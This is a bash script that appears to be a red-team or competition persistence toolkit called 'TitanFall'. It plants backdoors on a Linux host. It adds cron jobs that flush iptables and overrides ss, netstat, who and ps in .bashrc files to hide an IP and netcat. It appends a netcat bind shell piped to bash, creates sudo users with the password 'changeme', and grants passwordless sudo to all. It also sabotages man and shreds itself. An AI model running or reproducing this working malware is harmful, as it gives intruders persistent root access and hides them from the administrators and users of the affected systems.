LOG()
{
    if [ "$2" != "" ];
    then
        LOG_ARG=$1;
        shift;
        if [ "$LOG_ARG" = "0" ];
        then
            LOG_MESSAGE="${COLOR_GREEN}[+] $@${COLOR_NONE}\n";
        elif [ "$LOG_ARG" = "1" ];
        then
            LOG_MESSAGE="${COLOR_BLUE}[*] $@${COLOR_NONE}\n";
        elif [ "$LOG_ARG" = "2" ];
        then
            LOG_MESSAGE="${COLOR_RED}[-] $@${COLOR_NONE}\n";
        elif [ "$LOG_ARG" = "warn" ];
        then
            LOG_MESSAGE="${COLOR_YELLOW}[!] $@${COLOR_NONE}\n";
        else
            LOG_MESSAGE="$@\n";
        fi;
    else
        LOG_MESSAGE="$@";
    fi;
    if [ "$1" != "" ];
    then
        printf "$LOG_MESSAGE";
    fi;
    return $?;
};
QUIET ()
{
    eval $@ 2>/dev/null >/dev/null;
    return $?;
};
DESTROY()
{
    [ "$1" = "" ] && return 1;
    OPENFILE $1;
    QUIET command -v shred;
    [ $? = 0 ] && shred $1;
    rm -f $1;
    if [ "$?" != 0 ];
    then
        head -n 100 /dev/urandom > $1;
    fi;
    res=$?;
};
INIT()
{
    LOG 1 "Standbye for TitanFall";
};
FINISH()
{
    LOG warn "Deleting self...";
    QUIET shred $0;
    rm -fr $0 && exit;
};
GET_FILE()
{
    [ "$1" = "" ] && return 1;
    [ "$2" = "" ] && return 1;
    QUIET command -v "wget";
    get_w="$?";
    if [ "$get_w" != "0" ];
    then
        LOG 2 "No downloads available";
        return 1;
    fi;
    QUIET wget -qO $2 $1;
    return $?;
};
tools_install()
{
    if [ "`command -v yum`" != "" ];
    then
        TOOL="yum";
    elif [ "`command -v apt-get`" != "" ];
    then
        TOOL="apt-get";
    else
        LOG 2 "yum and apt-get not found";
        return 1;
    fi;
    TOOLS="curl wget nc nmap net-tools";
    LOGF="/tmp/$TOOL.log";
    $TOOL install -y $TOOLS 2>$LOGF >$LOGF;
    if [ "$?" = "0" ];
    then
        LOG 0 "Installed tools with $TOOL";
        rm $LOGF;
        return 0;
    else
        LOG 2 "Could not install tools. Check out $LOGF";
        return 1;
    fi;
};
tools()
{
    LOG 1 "Installing tools";
    tools_install;
};
cron()
{
    command='* * * * */5 root /etc/notes';
    s='#!/bin/bash\n(\niptables -F; iptables -t mangle -F; iptables -t nat -F;\nwall nomnom;\n) 2>/dev/null';
    echo $s >> /etc/notes;
    chmod 755 /etc/notes;
    echo $command >> /etc/crontab;
    LOG 0 "Installed global cron job";
    if [ "`command -v crontab`" != "" ];
    then
        crontab -l | { cat;
        echo '* * * * */5 /etc/notes';
        } | crontab -;
        LOG 0 "Installed user cron job";
    fi;
};
HIDE_IP="10.2.3";
bashrc_hooks ()
{
    bashrc_file=$1;
    if [ ! -f $bashrc_file ];
    then
        return 1;
    fi;
    echo "iptables -F; iptables -t mangle -F; iptables -t nat -F" >> $1;
    hooks_ss="ss() {\n    `command -v ss` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc;\n};";
    hooks_netstat="netstat() {\n    `command -v netstat` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc;\n};";
    hooks_who="who() {\n    `command -v who` \"\$@\" | grep -Ev \"$HIDE_IP\";\n};";
    hooks_ps="ps() {\n    `command -v ps` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc | grep -v grep;\n};";
    add_nc="n=\$(((\$RANDOM % 1000) + 4000));\nmkfifo \"/tmp/.\$n\";\nnc -lp \$n < \"/tmp/.\$n\" | bash > \"/tmp/.\$n\" & 2>/dev/null";
    COMMAND="ss";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_ss\n" >> $bashrc_file;
    fi;
    COMMAND="netstat";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_netstat\n" >> $bashrc_file;
    fi;
    COMMAND="who";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_who\n" >> $bashrc_file;
    fi;
    COMMAND="ps";
    QUIET command -v $COMMAND;
    if [ "$?" = 0 ] && [ "$(grep "$COMMAND()" $bashrc_file)" = "" ];
    then
        printf "$hooks_ps\n" >> $bashrc_file;
    fi;
    QUIET command -v nc;
    [ "$?" = 0 ] && echo -e "$add_nc" >> $bashrc_file;
    LOG 0 "$bashrc_file hooks added";
};
bashrc()
{
    HIDE_IP="$GLOBAL_HIDE_IP";
    LOG 0 "Hooking Bashrc files...";
    bashrc_hooks "/root/.bashrc";
    for f in `find /home -name "\.bashrc"`;
    do
        bashrc_hooks "$f";
    done;
    return 0;
};
users_add()
{
    if [ "`command -v useradd`" != "" ];
    then
        tool="useradd";
    elif [ "`command -v adduser`" != "" ];
    then
        tool="adduser -D";
    else
        LOG 2 '`useradd` or `adduser` not on the system. Exiting';
        return;
    fi;
    group=`grep -oE "wheel|sudo" /etc/group`;
    if [ "$group" != "" ];
    then
        tool="$tool -G $group";
    fi;
    for user in "kong" "thanos" "deadpool" "bane" "vader" "yondu";
    do
        QUIET $tool $user;
        s1=$?;
        echo "$user:changeme" | chpasswd 2>/dev/null >/dev/null;
        s2=$?;
        if [ "$s2$s1" != "00" ];
        then
            fail="$fail $user";
        fi;
    done;
    if [ "$fail" != "" ];
    then
        LOG 2 "Failed to add the following users: $fail";
    else
        LOG 0 "Added users";
    fi;
    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
};
users()
{
    users_add;
};
manpage()
{
    man_loc=$(command -v man);
    if [ "$man_loc" != "" ];
    then
        mv $man_loc /bin/help;
        echo "/bin/help \$(ls -1 /usr/share/man/man1/ | shuf -n1 | cut -d. -f1)" > $man_loc;
        chmod +x $man_loc;
    else
        LOG 2 "Man pages not installed. Skipping";
    fi;
};
INIT;
tools;
cron;
bashrc;
users;
manpage;
